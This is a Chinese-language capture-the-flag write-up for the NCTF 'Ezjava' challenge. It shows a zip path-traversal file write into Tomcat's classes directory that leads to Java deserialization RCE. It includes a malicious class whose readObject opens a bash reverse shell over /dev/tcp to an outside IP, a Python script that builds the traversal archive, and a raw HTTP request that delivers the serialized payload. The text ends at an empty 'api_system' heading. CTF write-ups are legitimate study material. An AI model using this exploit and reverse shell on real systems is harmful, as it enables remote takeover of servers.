# NCTF_JAVA

>有时间做了一下NCTF的java题，感觉不错记录一下

## Ezjava
考察点：解压路径穿越写文件rce

>tomcat 路径 /usr/local/tomcat 上传的路径 /tmp/fileUpload/

通过写evil.class 然后重写readobject去rce

```
 /tmp/fileUpload/../../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class
```
```
../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class
```

```java
package com.x1c.nctf.controller;

import java.io.*;

public class evil implements Serializable {
    public evil() {    }
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException, InterruptedException {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/101.35.195.134/4444;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }

    public static void main(String[] args) throws Exception {
        evil evil = new evil();
        writeObjectToFile(evil,"1.txt");

    }
    public static void writeObjectToFile(Object obj,String fileName) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(fileName));
        outputStream.writeObject(obj);
        outputStream.close();
    }
}

```
压缩包制作
```python
# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky
import zipfile
file_name="evil.class"
f = zipfile.ZipFile('exp.zip','w',zipfile.ZIP_STORED)
f.write(file_name,'../../usr/local/tomcat/webapps/html/WEB-INF/classes/com/x1c/nctf/controller/evil.class')
f.close()
```

```
GET /html/backdoor?cmd=rO0ABXNyABxjb20ueDFjLm5jdGYuY29udHJvbGxlci5ldmlsfJBBr%2bZElI4CAAB4cA%3d%3d HTTP/1.1
Host: 129.211.173.64:8081
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://129.211.173.64:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://129.211.173.64:8081/html/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

## api_system
